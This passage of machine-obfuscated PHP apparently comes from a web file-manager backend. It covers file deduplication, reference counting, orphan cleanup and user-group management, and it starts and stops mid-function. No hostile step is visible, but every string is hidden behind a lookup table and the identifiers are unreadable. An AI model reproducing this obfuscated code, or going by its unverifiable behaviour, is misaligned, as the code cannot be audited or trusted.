mk_dir($Ê“èğ¤); } $ñÔ¼èó = $Ê“èğ¤ . $¦º¥åäâ[2029] . rand_string(16); file_put_contents($ñÔ¼èó, $Ú˜¿Úü™); $¬Õ¬îÉ = $this->addFile($ñÔ¼èó, $è‚¨ƒ§‘, !0); if (file_exists($ñÔ¼èó)) { @unlink($ñÔ¼èó); } return $¬Õ¬îÉ; } public function createFileName($¬™‰Ãà­, $¢½ƒà¹¨ = false, $“ûÖâ‡ï = false) { $Ôºˆ¥ =& $_SERVER[÷åé¼î]; $öÒğºçí = IO::init($Ôºˆ¥[8]); $Û¢ûƒº¢ = $this->makeFilePath($¬™‰Ãà­, $öÒğºçí, $¢½ƒà¹¨, $“ûÖâ‡ï); $ˆüªÏî¥ = $öÒğºçí->pathFather($Û¢ûƒº¢); static $íí¿‡¯¥ = false; $ˆÈ¯„Š = $Ôºˆ¥[2030] . md5($ˆüªÏî¥); if (!$íí¿‡¯¥ && !Cache::get($ˆÈ¯„Š)) { $íí¿‡¯¥ = !0; $†ª»ß·² = IO::mkdir($ˆüªÏî¥); if (!IO::exist($†ª»ß·² . $Ôºˆ¥[862])) { IO::mkfile($†ª»ß·² . $Ôºˆ¥[862]); } Cache::set($ˆÈ¯„Š, 1, 3600 * 2); } return $Û¢ûƒº¢; } public function makeFilePath($Û”«·ÁØ, $²‰¸’¹‡, $×¦­åÕ÷ = false, $Õ¥ÔÂ«Ã = false) { $‘¸Ä‚·• =& $_SERVER[÷åé¼î]; $€†ñï¾ = Model($‘¸Ä‚·•[835])->get($‘¸Ä‚·•[2031]); $ºÑÕòşÉ = KodIO::defaultIO() . date($‘¸Ä‚·•[2032]); $›š™¡ÉŒ = $ºÑÕòşÉ . rand_string(5) . short_id(100); $Û”«·ÁØ = str_replace($‘¸Ä‚·•[8], $‘¸Ä‚·•[11], KodIO::clear($Û”«·ÁØ)); $ìèşşı = $²‰¸’¹‡->ext($Û”«·ÁØ); if (!$Û”«·ÁØ) { $€†ñï¾ = $‘¸Ä‚·•[841]; } switch ($€†ñï¾) { case $‘¸Ä‚·•[2033]: if ($ìèşşı) { $›š™¡ÉŒ = $›š™¡ÉŒ . $‘¸Ä‚·•[10] . $ìèşşı; } if ($ìèşşı == $‘¸Ä‚·•[1970]) { $›š™¡ÉŒ .= $‘¸Ä‚·•[1285]; } break; case $‘¸Ä‚·•[2034]: $ßè´ìÙÎ = Model($‘¸Ä‚·•[835])->get($‘¸Ä‚·•[836]); $İìÈ¸ßÑ = substr(md5($‘¸Ä‚·•[837] . $ßè´ìÙÎ . date($‘¸Ä‚·•[814])), 0, 8); $¨ºÒ‘¬¯ = KodIO::defaultDriver(); $ºÑÕòşÉ = $‘¸Ä‚·•[1316] . $¨ºÒ‘¬¯[$‘¸Ä‚·•[459]] . $‘¸Ä‚·•[468] . date($‘¸Ä‚·•[2035]) . $İìÈ¸ßÑ . $‘¸Ä‚·•[8]; if ($ìèşşı == $‘¸Ä‚·•[1970]) { $Û”«·ÁØ .= $‘¸Ä‚·•[1285]; } $¨ôß°íŒ = $‘¸Ä‚·•[2036] . $ºÑÕòşÉ . $Û”«·ÁØ; CacheLock::lock($¨ôß°íŒ); $›š™¡ÉŒ = $ºÑÕòşÉ . $Û”«·ÁØ; if (IO::exist($ºÑÕòşÉ . $Û”«·ÁØ)) { $Ù­°‚ÕŠ = substr($Û”«·ÁØ, 0, strlen($Û”«·ÁØ) - strlen($ìèşşı)); $Ç®ƒ‘Ñš = $Õ¥ÔÂ«Ã ? substr($Õ¥ÔÂ«Ã, 0, 5) : ($×¦­åÕ÷ ? substr($×¦­åÕ÷, 0, 5) : rand_string(5)); $›š™¡ÉŒ = $ºÑÕòşÉ . $Ù­°‚ÕŠ . $Ç®ƒ‘Ñš; if ($ìèşşı) { $›š™¡ÉŒ = $›š™¡ÉŒ . $‘¸Ä‚·•[10] . $ìèşşı; } } if (IO::isOsDriver($›š™¡ÉŒ) && !IO::isUploadServer($›š™¡ÉŒ)) { if (IO::exist($›š™¡ÉŒ)) { return $›š™¡ÉŒ; } $±Š´ÁËœ = IO::setContent($›š™¡ÉŒ, $‘¸Ä‚·•[12]); if (!$±Š´ÁËœ) { show_json($‘¸Ä‚·•[2037], !1); } } CacheLock::unlock($¨ôß°íŒ); break; case $‘¸Ä‚·•[841]: break; default: break; } return $›š™¡ÉŒ; } public function addFileByRemote($ö¦úÛâ, $ç‡ğ—·—, $ª¶¦ûÏ = array()) { $Ãò–ù¤ =& $_SERVER[÷åé¼î]; if (!IO::exist($ö¦úÛâ)) { return !1; } $è¢¶Íòê = $ª¶¦ûÏ[$Ãò–ù¤[531]] ? $ª¶¦ûÏ[$Ãò–ù¤[531]] : $Ãò–ù¤[12]; $Ò¬„ùíå = IO::hashMd5($ö¦úÛâ, $è¢¶Íòê); $Ø…ÜàË² = KodIO::defaultDriver(); $—Íœú‹È = array($Ãò–ù¤[601] => IO::size($ö¦úÛâ), $Ãò–ù¤[2038] => 1, $Ãò–ù¤[478] => $ç‡ğ—·—, $Ãò–ù¤[873] => $Ø…ÜàË²[$Ãò–ù¤[459]], $Ãò–ù¤[479] => $ö¦úÛâ, $Ãò–ù¤[2039] => $ª¶¦ûÏ[$Ãò–ù¤[656]] ? $ª¶¦ûÏ[$Ãò–ù¤[656]] : IO::hashSimple($ö¦úÛâ), $Ãò–ù¤[2040] => $Ò¬„ùíå ? $Ò¬„ùíå : $è¢¶Íòê); if ($ŒŞ£¢–´ = $this->addFileCheckExist($—Íœú‹È[$Ãò–ù¤[656]], $—Íœú‹È[$Ãò–ù¤[531]], $—Íœú‹È[$Ãò–ù¤[79]])) { return $ŒŞ£¢–´; } return $this->addFileData($—Íœú‹È); } private function addFileData($¥Ó‡·”) { $Ğä¤Ş—û =& $_SERVER[÷åé¼î]; if (!$¥Ó‡·”) { return !1; } $¥Ó‡·”[$Ğä¤Ş—û[79]] = intval($¥Ó‡·”[$Ğä¤Ş—û[79]]); if (!$¥Ó‡·”[$Ğä¤Ş—û[79]] && strlen($¥Ó‡·”[$Ğä¤Ş—û[656]]) > 32) { $¥Ó‡·”[$Ğä¤Ş—û[79]] = intval(substr($¥Ó‡·”[$Ğä¤Ş—û[656]], 32)); } $Î¡¿òÚÌ = $this->add($¥Ó‡·”); return $this->find($Î¡¿òÚÌ); } public function addFile($ÕìÎÏ™¹, $ÙœÚ²–¼, $îËÀ¤ğ€ = false) { $‰ä‡Àš =& $_SERVER[÷åé¼î]; $•öÁ»Ò‡ = IO::hashSimple($ÕìÎÏ™¹); $Ú şÚÒ× = IO::size($ÕìÎÏ™¹); $ÜÜŸé¼ = $Ú şÚÒ× <= 1024 * 1024 * 10 ? IO::hashMd5($ÕìÎÏ™¹) : $‰ä‡Àš[12]; $¢Ÿ²«·¨ = $‰ä‡Àš[2041] . $•öÁ»Ò‡; CacheLock::lock($¢Ÿ²«·¨); if ($ÜÜŸé¼ && $•öÁ»Ò‡) { $›•µ¢  = $this->addFileCheckExist($•öÁ»Ò‡, $ÜÜŸé¼, $Ú şÚÒ×); if ($›•µ¢ ) { CacheLock::unlock($¢Ÿ²«·¨); return $›•µ¢ ; } } $«½¸Ÿ„× = $this->addFileMake($ÕìÎÏ™¹, $Ú şÚÒ×, $•öÁ»Ò‡, $ÜÜŸé¼, $ÙœÚ²–¼, $îËÀ¤ğ€); $£ÉúÔá = $this->addFileData($«½¸Ÿ„×); CacheLock::unlock($¢Ÿ²«·¨); if (!$ÜÜŸé¼ && $£ÉúÔá) { $this->fileMd5Check($£ÉúÔá); } return $£ÉúÔá; } public function fileMd5Check($Ê¼¸ñ©) { $ÙóªùóÖ =& $_SERVER[÷åé¼î]; $§ÕÛõ = array($Ê¼¸ñ©[$ÙóªùóÖ[525]], $Ê¼¸ñ©[$ÙóªùóÖ[87]]); $£²ÂĞÁ¦ = $ÙóªùóÖ[2042] . $Ê¼¸ñ©[$ÙóªùóÖ[87]]; $¨êÊê¾¯ = $ÙóªùóÖ[2043] . $Ê¼¸ñ©[$ÙóªùóÖ[525]]; TaskQueue::add($ÙóªùóÖ[2044], $§ÕÛõ, $£²ÂĞÁ¦, $¨êÊê¾¯); } public function fileMd5Set($ôÓ°»˜, $œì¡ï™) { $²ç£ÌÍ€ =& $_SERVER[÷åé¼î]; $ëèæ¾Ì = $this->find($ôÓ°»˜); if (!$ëèæ¾Ì || $ëèæ¾Ì[$²ç£ÌÍ€[531]]) { return; } $ÔÜãñ±§ = IO::hashMd5($œì¡ï™); if (!$ÔÜãñ±§) { return $²ç£ÌÍ€[12]; } $this->where(array($²ç£ÌÍ€[525] => $ôÓ°»˜))->save(array($²ç£ÌÍ€[531] => $ÔÜãñ±§)); } public function addFileMake($Şï­ş—ş, $Å±Û³û, $ñªÚ§½­, $§¢¿º‡õ, $ÕëºëÅÙ, $½ÉÄ·åŒ) { $¹ó¥¸“Ì =& $_SERVER[÷åé¼î]; $öÊì€ˆ = $this->createFileName($ÕëºëÅÙ, $ñªÚ§½­, $§¢¿º‡õ); $òÉÍ¶ıñ = get_path_father($öÊì€ˆ); $¦ıÜ™À = get_path_this($öÊì€ˆ); if ($½ÉÄ·åŒ) { $İñ¸·å¨ = IO::move($Şï­ş—ş, $òÉÍ¶ıñ, !1, $¦ıÜ™À); } else { $İñ¸·å¨ = IO::copy($Şï­ş—ş, $òÉÍ¶ıñ, !1, $¦ıÜ™À); } if (!$İñ¸·å¨) { return !1; } $ÑÏõıÊ¾ = KodIO::defaultDriver(); $ö×¿©¯Ö = array($¹ó¥¸“Ì[601] => $Å±Û³û, $¹ó¥¸“Ì[2038] => 1, $¹ó¥¸“Ì[478] => $ÕëºëÅÙ, $¹ó¥¸“Ì[873] => $ÑÏõıÊ¾[$¹ó¥¸“Ì[459]], $¹ó¥¸“Ì[479] => $öÊì€ˆ, $¹ó¥¸“Ì[2039] => $ñªÚ§½­, $¹ó¥¸“Ì[2040] => $§¢¿º‡õ); return $ö×¿©¯Ö; } public function addFileCheckExist($¿°ÃàÕ‚, $®…Ùúº™, $¨‹–î™¥) { $ö÷ˆ³ŒÉ =& $_SERVER[÷åé¼î]; $…åÆÆğü = $this->findByHash($¿°ÃàÕ‚, $®…Ùúº™); if (!$…åÆÆğü) { return !1; } $™¨‰ª«– = array($ö÷ˆ³ŒÉ[2038] => intval($…åÆÆğü[$ö÷ˆ³ŒÉ[2045]]) + 1, $ö÷ˆ³ŒÉ[601] => $¨‹–î™¥); $this->where(array($ö÷ˆ³ŒÉ[526] => $…åÆÆğü[$ö÷ˆ³ŒÉ[525]]))->save($™¨‰ª«–); return $…åÆÆğü; } public function remove($„Ãíµ) { $this->linkCountChange($„Ãíµ, !1); $this->clearEmpty(); return !0; } public function linkAdd($¸œÊå€) { $this->linkCountChange($¸œÊå€, !0); } public function linkCountChange($àò“÷ˆş, $¯ë¨ĞÖ) { $¿…ÃÉØÅ =& $_SERVER[÷åé¼î]; if (!$àò“÷ˆş) { return; } if (!is_array($àò“÷ˆş)) { $àò“÷ˆş = array($àò“÷ˆş); } $çÌÛ£á¸ = array(); foreach ($àò“÷ˆş as $€Ã•Üéä) { $–ÙëÇĞ· = $€Ã•Üéä . $¿…ÃÉØÅ[12]; if (!$çÌÛ£á¸[$–ÙëÇĞ·]) { $çÌÛ£á¸[$–ÙëÇĞ·] = 0; } $çÌÛ£á¸[$–ÙëÇĞ·]++; } $ò–üÜá¼ = array(); foreach ($çÌÛ£á¸ as $€Ã•Üéä => $Ø„‡ÑĞ¾) { $–ÙëÇĞ· = $Ø„‡ÑĞ¾ . $¿…ÃÉØÅ[12]; if (!$ò–üÜá¼[$–ÙëÇĞ·]) { $ò–üÜá¼[$–ÙëÇĞ·] = array(); } $ò–üÜá¼[$–ÙëÇĞ·][] = $€Ã•Üéä; } foreach ($ò–üÜá¼ as $Ø„‡ÑĞ¾ => $÷Õå½¾•) { if (!$÷Õå½¾•) { continue; } $Ø„‡ÑĞ¾ = $¯ë¨ĞÖ ? $Ø„‡ÑĞ¾ : -intval($Ø„‡ÑĞ¾); $¨›ğ„èÃ = array($¿…ÃÉØÅ[525] => array($¿…ÃÉØÅ[7], $÷Õå½¾•)); if ($Ø„‡ÑĞ¾ < 0) { $¨›ğ„èÃ[$¿…ÃÉØÅ[2045]] = array($¿…ÃÉØÅ[1087], abs($Ø„‡ÑĞ¾)); } $this->where($¨›ğ„èÃ)->setAdd($¿…ÃÉØÅ[2045], $Ø„‡ÑĞ¾); } } public function findByHash($ï×ªó–„, $°ğüîû‰ = false) { $÷ÂÌ¨ô” =& $_SERVER[÷åé¼î]; if (!$ï×ªó–„ && !$°ğüîû‰) { return !1; } $Ë‘¿£áş = array($÷ÂÌ¨ô”[2039] => $ï×ªó–„); if ($°ğüîû‰) { $Ë‘¿£áş = array($÷ÂÌ¨ô”[2040] => $°ğüîû‰); } return $this->order($÷ÂÌ¨ô”[2046])->where($Ë‘¿£áş)->find(); } public function clearEmpty($Â÷¢¬Üİ = 0) { $ƒ‰Â½  =& $_SERVER[÷åé¼î]; $ãœ¾•ÍŸ = time() - 3600 * 24 * $Â÷¢¬Üİ; $½®ùøÎ = $ƒ‰Â½ [2047] . $ãœ¾•ÍŸ; $ãÕÍœ°í = $this->where($½®ùøÎ)->select(); if (!$ãÕÍœ°í) { return; } $¼ˆ˜±Š÷ = new Task($ƒ‰Â½ [2048], $ƒ‰Â½ [12], count($ãÕÍœ°í)); foreach ($ãÕÍœ°í as $×İŸ³Æ˜) { $¼ˆ˜±Š÷->update(1); $this->resetFile($×İŸ³Æ˜); } $¼ˆ˜±Š÷->end(); } public function resetFile($Ÿ›ùˆ) { $¹ºÂ·¼ğ =& $_SERVER[÷åé¼î]; $¦…„òúñ = array($¹ºÂ·¼ğ[526] => $Ÿ›ùˆ[$¹ºÂ·¼ğ[525]]); $ÍÆŠ° = Model($¹ºÂ·¼ğ[1414])->where($¦…„òúñ)->count(); $µÂÙ‡õÃ = Model($¹ºÂ·¼ğ[2049])->where($¦…„òúñ)->count(); $ìöê‘êï = intval($ÍÆŠ°) + intval($µÂÙ‡õÃ); if ($ìöê‘êï == 0) { IO::remove($Ÿ›ùˆ[$¹ºÂ·¼ğ[87]]); Model($¹ºÂ·¼ğ[2050])->delete($Ÿ›ùˆ[$¹ºÂ·¼ğ[525]]); $this->where($¦…„òúñ)->delete(); $this->metaSet($Ÿ›ùˆ[$¹ºÂ·¼ğ[525]], null, null); write_log(ACTION . $¹ºÂ·¼ğ[2051] . KodUser::id() . $¹ºÂ·¼ğ[2052] . $Ÿ›ùˆ[$¹ºÂ·¼ğ[525]] . $¹ºÂ·¼ğ[2053] . $Ÿ›ùˆ[$¹ºÂ·¼ğ[79]] . $¹ºÂ·¼ğ[201] . $Ÿ›ùˆ[$¹ºÂ·¼ğ[87]], $¹ºÂ·¼ğ[2054]); return; } if ($Ÿ›ùˆ[$¹ºÂ·¼ğ[2045]] != $ìöê‘êï) { $this->where($¦…„òúñ)->save(array($¹ºÂ·¼ğ[2038] => $ìöê‘êï)); } } public function storageInfo($±Ò¿ïöÂ = false) { $àìö«¥„ =& $_SERVER[÷åé¼î]; $€‘ÊÉúÑ = $this->count() + 0.0; $®ßÀœ÷Š = 0; $û Üèôô = 1; $Ù÷ëÀÒ£ = 0; $†º¿æ¦ = 5000; for ($ˆöí—Ïƒ = 0; $ˆöí—Ïƒ < $€‘ÊÉúÑ; $ˆöí—Ïƒ = $ˆöí—Ïƒ + $†º¿æ¦) { $å÷Ü†‰ = $this->limit($ˆöí—Ïƒ, $ˆöí—Ïƒ + $†º¿æ¦)->select(); foreach ($å÷Ü†‰ as $‡†´İû—) { $û Üèôô += $‡†´İû—[$àìö«¥„[79]] * $‡†´İû—[$àìö«¥„[2045]]; $®ßÀœ÷Š += $‡†´İû—[$àìö«¥„[79]] * ($‡†´İû—[$àìö«¥„[2045]] - 1); $Ù÷ëÀÒ£ += $‡†´İû—[$àìö«¥„[2045]]; } } $î£ı¶â = array($àìö«¥„[2055] => $û Üèôô, $àìö«¥„[2056] => $®ßÀœ÷Š, $àìö«¥„[2057] => $®ßÀœ÷Š / $û Üèôô, $àìö«¥„[83] => $€‘ÊÉúÑ, $àìö«¥„[2058] => $Ù÷ëÀÒ£); return $î£ı¶â; } } class GroupModel extends ModelBase { protected $tableName = "\147\162\x6f\165\160"; protected $tableMeta = array("\x74\x61\142\154\145\x4e\141\155\x65" => "\x67\162\x6f\165\160\x5f\x6d\145\164\x61", "\x6d\145\164\x61\x46\x69\145\x6c\144" => "\147\x72\x6f\165\x70\x49\104"); protected function cacheFunctionAlias($½±£¦»Ù) { $„È‘ÇÅ =& $_SERVER[÷åé¼î]; return array($„È‘ÇÅ[2059] => array($½±£¦»Ù[0], $„È‘ÇÅ[2060]), $„È‘ÇÅ[2061] => array($½±£¦»Ù[0], $„È‘ÇÅ[2062])); } protected function getInfo($óÄ­µî , $Œù×½ü­ = false) { $Ù×’†Œ  = $this->getInfoSimple($óÄ­µî ); if (!$Ù×’†Œ ) { return !1; } if ($Œù×½ü­) { return $this->_listDataApplyItem($Ù×’†Œ ); } return $this->cacheFunctionGet($_SERVER[÷åé¼î][2063], $óÄ­µî ); } protected function getInfoSimple($ÉğÛò®œ, $¹ººØí = false) { $İ¥ÍØ¥ =& $_SERVER[÷åé¼î]; if ($¹ººØí) { $È¢¶Á¥ = array($İ¥ÍØ¥[1977] => intval($ÉğÛò®œ)); $Åâ†‡‹ = $this->where($È¢¶Á¥)->find(); return is_array($Åâ†‡‹) ? $Åâ†‡‹ : array(); } return $this->cacheFunctionGet($İ¥ÍØ¥[2064], $ÉğÛò®œ); } protected function groupAdd($ãñ¶…ƒ) { $¥²Áå»È =& $_SERVER[÷åé¼î]; if (!$ãñ¶…ƒ[$¥²Áå»È[192]] && isset($ãñ¶…ƒ[$¥²Áå»È[1977]]) && $ãñ¶…ƒ[$¥²Áå»È[1977]] == 1) { if ($ˆ‘ÕİÜÃ = $this->getInfoSimple($ãñ¶…ƒ[$¥²Áå»È[1977]], !0)) { return $ãñ¶…ƒ[$¥²Áå»È[1977]]; } } else { $ˆ‘ÕİÜÃ = $this->getInfoSimple($ãñ¶…ƒ[$¥²Áå»È[192]]); if (!$ˆ‘ÕİÜÃ) { return !1; } } $ ŒˆÃÓÈ = $¥²Áå»È[578]; if ($ˆ‘ÕİÜÃ[$¥²Áå»È[568]]) { $ ŒˆÃÓÈ = $ˆ‘ÕİÜÃ[$¥²Áå»È[568]] . $ˆ‘ÕİÜÃ[$¥²Áå»È[1977]] . $¥²Áå»È[50]; } $Ö…´š–’ = array($¥²Áå»È[478] => $this->groupNameAuto($ãñ¶…ƒ[$¥²Áå»È[192]], $ãñ¶…ƒ[$¥²Áå»È[32]]), $¥²Áå»È[461] => $ãñ¶…ƒ[$¥²Áå»È[192]], $¥²Áå»È[636] => $ ŒˆÃÓÈ, $¥²Áå»È[2065] => $ãñ¶…ƒ[$¥²Áå»È[1964]], $¥²Áå»È[2066] => 0, $¥²Áå»È[1981] => 0); if (isset($ãñ¶…ƒ[$¥²Áå»È[2001]])) { $Ö…´š–’[$¥²Áå»È[2001]] = $ãñ¶…ƒ[$¥²Áå»È[2001]]; } else { $õ¶öÈ = $this->max($¥²Áå»È[2001]); if (!$õ¶öÈ) { $õ¶öÈ = 0; } $Ö…´š–’[$¥²Áå»È[2001]] = $õ¶öÈ + 1; } if (!empty($ãñ¶…ƒ[$¥²Áå»È[1977]])) { $Ö…´š–’[$¥²Áå»È[1977]] = $ãñ¶…ƒ[$¥²Áå»È[1977]]; } $ÌÛ«ŸÒ¿ = $this->add($Ö…´š–’); $this->setNamePinyin($ÌÛ«ŸÒ¿, $Ö…´š–’[$¥²Áå»È[32]]); if (isset($ãñ¶…ƒ[$¥²Áå»È[2067]])) { $this->metaSet($ÌÛ«ŸÒ¿, array($¥²Áå»È[2067] => $ãñ¶…ƒ[$¥²Áå»È[2067]], $¥²Áå»È[2068] => $ãñ¶…ƒ[$¥²Áå»È[2068]])); unset($ãñ¶…ƒ[$¥²Áå»È[2067]]); unset($ãñ¶…ƒ[$¥²Áå»È[2068]]); } Model($¥²Áå»È[1414])->groupRootAdd($ÌÛ«ŸÒ¿); $this->_clearCache($ãñ¶…ƒ[$¥²Áå»È[192]]); return $ÌÛ«ŸÒ¿; } protected function groupEdit($—º³§ôï, $™àÆÛØë) { $¯æé…ƒ° =& $_SERVER[÷åé¼î]; $Í”îŞç = $this->getInfoSimple($—º³§ôï); if (!$Í”îŞç) { return !1; } if (!empty($™àÆÛØë[$¯æé…ƒ°[192]])) { $ÜÔ¤³°Ò = $this->getInfoSimple($™àÆÛØë[$¯æé…ƒ°[192]]); if (!$ÜÔ¤³°Ò) { return !1; } if ($Í”îŞç[$¯æé…ƒ°[1977]] == $ÜÔ¤³°Ò[$¯æé…ƒ°[1977]]) { return !1; } if ($™àÆÛØë[$¯æé…ƒ°[192]] != $Í”îŞç[$¯æé…ƒ°[192]]) { if ($ÜÔ¤³°Ò[$¯æé…ƒ°[568]] !== $Í”îŞç[$¯æé…ƒ°[568]] && strpos($ÜÔ¤³°Ò[$¯æé…ƒ°[568]], $Í”îŞç[$¯æé…ƒ°[568]] . $Í”îŞç[$¯æé…ƒ°[1977]] . $¯æé…ƒ°[50]) === 0) { return !1; } $™àÆÛØë[$¯æé…ƒ°[636]] = $ÜÔ¤³°Ò[$¯æé…ƒ°[568]] . $™àÆÛØë[$¯æé…ƒ°[192]] . $¯æé…ƒ°[50]; $this->_changeChildLevel($Í”îŞç, $ÜÔ¤³°Ò); $this->_clearCache($ÜÔ¤³°Ò[$¯æé…ƒ°[1977]]); $this->_clearCache($Í”îŞç[$¯æé…ƒ°[192]]); } } if (isset($™àÆÛØë[$¯æé…ƒ°[32]])) { $this->setNamePinyin($—º³§ôï, $™àÆÛØë[$¯æé…ƒ°[32]]); } if (isset($™àÆÛØë[$¯æé…ƒ°[2067]])) { $this->metaSet($—º³§ôï, array($¯æé…ƒ°[2067] => $™àÆÛØë[$¯æé…ƒ°[2067]], $¯æé…ƒ°[2068] => $™àÆÛØë[$¯æé…ƒ°[2068]])); unset($™àÆÛØë[$¯æé…ƒ°[2067]]); unset($™àÆÛØë[$¯æé…ƒ°[2068]]); } $this->_clearChildrenCache($Í”îŞç); return $this->where(array($¯æé…ƒ°[2069] => $—º³§ôï))->save($™àÆÛØë); } private function _clearChildrenCache($–«êâ¡À) { $ÃÒñµ‚ =& $_SERVER[÷åé¼î]; $«·û¼Ì = array($ÃÒñµ‚[636] => array($ÃÒñµ‚[596], $–«êâ¡À[$ÃÒñµ‚[568]] . $–«êâ¡À[$ÃÒñµ‚[1977]] . $ÃÒñµ‚[597])); $È„‰Ôš = $this->field($ÃÒñµ‚[1977])->where($«·û¼Ì)->select(); foreach ($È„‰Ôš as $øÉ“Øé¤) { $this->_clearCache($øÉ“Øé¤[$ÃÒñµ‚[1977]]); } } private function _clearCache($¿¶Áí’Ñ) { $€ÅÔ¬î =& $_SERVER[÷åé¼î]; $this->cacheFunctionClear($€ÅÔ¬î[2063], $¿¶Áí’Ñ); $this->cacheFunctionClear($€ÅÔ¬î[2064], $¿¶Áí’Ñ); } private function _changeChildLevel($ûç¼ğ¬, $²¡×çÙ, $ñÓÊµÈÖ = false) { $´”¦—Óå =& $_SERVER[÷åé¼î]; $Ïª®¨Ç = $ûç¼ğ¬[$´”¦—Óå[568]] . $ûç¼ğ¬[$´”¦—Óå[1977]] . $´”¦—Óå[50]; $±ÅÑé”¿ = $²¡×çÙ[$´”¦—Óå[568]] . $²¡×çÙ[$´”¦—Óå[1977]] . $´”¦—Óå[50] . $ûç¼ğ¬[$´”¦—Óå[1977]] . $´”¦—Óå[50]; if ($ñÓÊµÈÖ) { $±ÅÑé”¿ = $²¡×çÙ[$´”¦—Óå[568]] . $²¡×çÙ[$´”¦—Óå[1977]] . $´”¦—Óå[50]; } $Âü¬Ìòê = array($´”¦—Óå[636] => array($´”¦—Óå[596], $ûç¼ğ¬[$´”¦—Óå[568]] . $ûç¼ğ¬[$´”¦—Óå[1977]] . $´”¦—Óå[597])); $œ©µÒ“Ÿ = array($´”¦—Óå[636] => array($´”¦—Óå[645], "\162\x65\x70\154\x61\x63\x65\50\160\x61\x72\x65\156\164\114\145\x76\x65\154\54\47{$Ïª®¨Ç}\x27\x2c\x27{$±ÅÑé”¿}\x27\x29")); $this->_clearChildrenCache($ûç¼ğ¬); $this->where($Âü¬Ìòê)->data($œ©µÒ“Ÿ)->save(); } public function setNamePinyin($ÚŠÔ£ü«, $ØÂ¯—¨œ = false) { $Êà¢€ù° =& $_SERVER[÷åé¼î]; if (!$ØÂ¯—¨œ) { $Ó¦Ğğ·— = $this->getInfoSimple($ÚŠÔ£ü«); $ØÂ¯—¨œ = $Ó¦Ğğ·—[$Êà¢€ù°[32]]; } if (!Input::check($ØÂ¯—¨œ, $Êà¢€ù°[639])) { $this->metaSet($ÚŠÔ£ü«, $Êà¢€ù°[522], null); $this->metaSet($ÚŠÔ£ü«, $Êà¢€ù°[521], null); return; } $æ…ó‹—¬ = array($Êà¢€ù°[522] => str_replace($Êà¢€ù°[53], $Êà¢€ù°[12], Pinyin::get($ØÂ¯—¨œ)), $Êà¢€ù°[521] => Pinyin::get($ØÂ¯—¨œ, $Êà¢€ù°[640])); $this->metaSet($ÚŠÔ£ü«, $æ…ó‹—¬); } protected function groupStatus($ä˜ï”—ƒ, $ò˜üäÂö) { $ä³½§Ñ =& $_SERVER[÷åé¼î]; $ŒÊÎüÚû = $this->getInfoSimple($ä˜ï”—ƒ); if (!$ŒÊÎüÚû) { return !1; } $this->_clearCache($ä˜ï”—ƒ); return $this->metaSet($ä˜ï”—ƒ, $ä³½§Ñ[815], $ò˜üäÂö); if ($ò˜üäÂö == $ä³½§Ñ[91]) { $üÌØêÖ = $this->parentLevelArray($ŒÊÎüÚû[$ä³½§Ñ[568]]); } else { } $üÌØêÖ[] = $ŒÊÎüÚû[$ä³½§Ñ[1977]]; $ì©Êğ = array(); foreach ($üÌØêÖ as $ä˜ï”—ƒ) { $ì©Êğ[] = array($ä³½§Ñ[1977] => $ä˜ï”—ƒ, $ä³½§Ñ[97] => $ä³½§Ñ[815], $ä³½§Ñ[434] => $ò˜üäÂö); $this->_clearCache($ä˜ï”—ƒ); } return Model($ä³½§Ñ[2070])->addAll($ì©Êğ, array(), !0); } protected function groupRemove($Â…Ãç–, $ÑÂ©‘ç· = false) { $ØÏİ‹µ¤ =& $_SERVER[÷åé¼î]; $¡Ëª„ÀÚ = array($ØÏİ‹µ¤[1977] => $Â…Ãç–); $¢ÏßÕŠ = $this->where($¡Ëª„ÀÚ)->find(); if (!$¢ÏßÕŠ || $¢ÏßÕŠ[$ØÏİ‹µ¤[192]] == 0) { return !1; } if (!$ÑÂ©‘ç·) { $ôÕ†©õ‡ = $this->getInfoSimple($¢ÏßÕŠ[$ØÏİ‹µ¤[192]]); $this->_changeChildLevel($¢ÏßÕŠ, $ôÕ†©õ‡, !0); $this->where(array($ØÏİ‹µ¤[192] => $Â…Ãç–))->save(array($ØÏİ‹µ¤[192] => $¢ÏßÕŠ[$ØÏİ‹µ¤[192]])); $this->_clearCache($ôÕ†©õ‡[$ØÏİ‹µ¤[1977]]); } Model($ØÏİ‹µ¤[2070])->where($¡Ëª„ÀÚ)->delete(); Model($ØÏİ‹µ¤[2071])->where($¡Ëª„ÀÚ)->delete(); Model($ØÏİ‹µ¤[889])->groupRootRemove($Â…Ãç–); $this->_clearCache($¢ÏßÕŠ[$ØÏİ‹µ¤[192]]); return $this->where($¡Ëª„ÀÚ)->delete(); } protected function groupSort($¢…ïƒá) { $íÖÃš‡î =& $_SERVER[÷åé¼î]; $í·ñ•º¾ = array(); foreach ($¢…ïƒá as $ İâ¹§ => $ôº‚öÒÃ) { $í·ñ•º¾[] = array($íÖÃš‡î[1977], $ôº‚öÒÃ, $íÖÃš‡î[2001], $ İâ¹§ + 1); } $this->saveAll($í·ñ•º¾); } public function listData() { $Ÿ©ë³âš = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ÿ©ë³âš[$_SERVER[÷åé¼î][429]]); return $Ÿ©ë³âš; } private function _makeOrder($™÷‘—äŒ = '') { $àØŒ“£° =& $_SERVER[÷åé¼î]; $Â»Îò”İ = array($àØŒ“£°[1977], $àØŒ“£°[32], $àØŒ“£°[1966], $àØŒ“£°[231]); $Ş¹Øä€“ = array($àØŒ“£°[507] => $àØŒ“£°[508], $àØŒ“£°[509] => $àØŒ“£°[510]); $‹§¯Åª‰ = Input::get($àØŒ“£°[514], $àØŒ“£°[7], $àØŒ“£°[1981], $Â»Îò”İ); $Á—èÀÉ = Input::get($àØŒ“£°[515], $àØŒ“£°[7], $àØŒ“£°[2072], array($àØŒ“£°[2072], $àØŒ“£°[509])); $Á—èÀÉ = $Ş¹Øä€“[$Á—èÀÉ]; $™÷‘—äŒ = $™÷‘—äŒ . "{$‹§¯Åª‰}\x20{$Á—èÀÉ}\54\40\x67\162\x6f\165\x70\x49\x44\40\x61\x73\143"; return $this->order($™÷‘—äŒ); } public function listChild($áØÙºá˜) { $ùÉ°É”Ö =& $_SERVER[÷åé¼î]; $Ö öä±• = $this->where(array($ùÉ°É”Ö[192] => $áØÙºá˜))->_makeOrder()->selectPage(200); $this->_listDataApply($Ö öä±•[$ùÉ°É”Ö[429]]); return $Ö öä±•; } public function listChildIds($±†Üš¼É) { $ÑŞÔ¢şô =& $_SERVER[÷åé¼î]; if (is_string($Œ¾é—¤½)) { $±†Üš¼É = explode($ÑŞÔ¢şô[50], $±†Üš¼É); } $ï×ëœ“· = $this->where(array($ÑŞÔ¢şô[1977] => array($ÑŞÔ¢şô[7], 